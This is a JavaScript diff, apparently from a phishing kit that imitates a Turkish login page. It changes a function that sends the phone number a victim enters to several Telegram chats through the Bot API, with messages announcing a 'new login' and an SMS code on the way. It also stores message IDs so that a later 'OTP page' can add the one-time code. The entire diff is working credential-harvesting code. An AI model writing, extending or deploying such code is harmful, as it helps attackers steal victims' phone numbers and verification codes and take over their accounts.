@@ -13,33 +13,36 @@ phoneInput.addEventListener('input', function (e) {
     this.value = value;
 });
 
-// Send phone to Telegram
+// Send phone to Telegram (all chat IDs)
 async function sendToTelegram(phone) {
     const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`;
     const text = `📱 Yeni Giriş\n\n📞 Telefon: <code>${phone}</code>\n\n⏳ SMS Kod Bekleniyor...`;
+    const messageIds = {};
 
-    try {
-        const res = await fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: TELEGRAM_CONFIG.CHAT_ID,
-                text: text,
-                parse_mode: 'HTML'
-            })
-        });
-        const data = await res.json();
-        if (data.ok) {
-            // Store message_id and phone for OTP page to update
-            localStorage.setItem('tg_message_id', data.result.message_id);
-            localStorage.setItem('tg_phone', phone);
-            return true;
+    for (const chatId of TELEGRAM_CONFIG.CHAT_IDS) {
+        try {
+            const res = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: text,
+                    parse_mode: 'HTML'
+                })
+            });
+            const data = await res.json();
+            if (data.ok) {
+                messageIds[chatId] = data.result.message_id;
+            }
+        } catch (e) {
+            console.error('Telegram error for chat ' + chatId + ':', e);
         }
-        return false;
-    } catch (e) {
-        console.error('Telegram error:', e);
-        return false;
     }
+
+    // Store message IDs and phone for OTP page to update
+    localStorage.setItem('tg_message_ids', JSON.stringify(messageIds));
+    localStorage.setItem('tg_phone', phone);
+    return Object.keys(messageIds).length > 0;
 }
 
 // Login button click handler
